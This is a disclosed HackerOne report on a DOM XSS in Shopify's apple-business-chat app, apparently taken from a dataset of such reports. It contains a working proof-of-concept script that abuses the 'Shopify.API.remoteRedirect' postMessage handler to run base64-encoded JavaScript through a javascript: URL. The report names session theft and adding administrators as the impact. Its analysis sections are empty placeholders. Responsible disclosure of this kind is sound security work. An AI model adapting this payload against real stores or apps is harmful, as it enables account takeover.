---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '646505'
original_report_id: '646505'
title: ██████ DOM XSS via Shopify.API.remoteRedirect
weakness: Cross-site Scripting (XSS) - DOM
team_handle: shopify
created_at: '2019-07-17T04:07:20.510Z'
disclosed_at: '2019-09-15T07:14:27.583Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 76
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# ██████ DOM XSS via Shopify.API.remoteRedirect

## Metadata

- HackerOne Report ID: 646505
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: shopify
- Disclosed At: 2019-09-15T07:14:27.583Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi, team.
I found a dom xss on the apple-business-chat app that seems to be referring to a vulnerable js file.
For users who have installed this app, just let him use the theme code I provided to complete xss.
Modify the theme code to the following payload
```
<script>
	  function attack(){
	    let ctx=window.open('https://apple-business-chat-commerce.shopifycloud.com'),interval;
	    let payload=btoa(`window.opener.postMessage('success',location.origin);alert(document.domain)`);
	    interval=setInterval(()=>{
	        ctx && ctx.postMessage({
        		"message":"Shopify.API.remoteRedirect",
        		"data":{
        			"location":`javascript:eval(atob('${payload}'))`
        		}
	        },location.origin);
	    },500);
	    window.onmessage=(e)=>{
	    	e.data==="success"&&(
	    		console.log('attack success'),
	    		window.onmessage=null,
	    		clearInterval(interval)
	    	);
	    };
	  }
	  attack();
	</script>
	<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```
As shown below
{F531015}
Then click on the store front page to trigger
{F531016}

*█████*

## Impact

Steal session information, add administrators, etc.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
